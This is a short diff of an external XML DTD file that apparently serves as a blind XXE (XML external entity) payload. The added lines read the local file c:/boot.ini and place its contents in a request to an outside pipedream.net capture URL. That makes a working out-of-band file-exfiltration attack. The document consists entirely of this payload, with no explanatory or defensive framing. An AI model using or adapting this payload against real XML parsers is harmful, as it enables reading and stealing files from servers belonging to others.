@@ -1,4 +1,5 @@
 <?xml version="1.0" encoding="utf-8" ?>
-<!ENTITY % exfil "<!ENTITY &#x25; exfil2 SYSTEM 'https://enllfgxx7hk1e.x.pipedream.net/got3'>">
+<!ENTITY % file SYSTEM "file:///c:/boot.ini">
+<!ENTITY % exfil "<!ENTITY &#x25; exfil2 SYSTEM 'https://enllfgxx7hk1e.x.pipedream.net/%file;'>">
 %exfil;
 %exfil2;
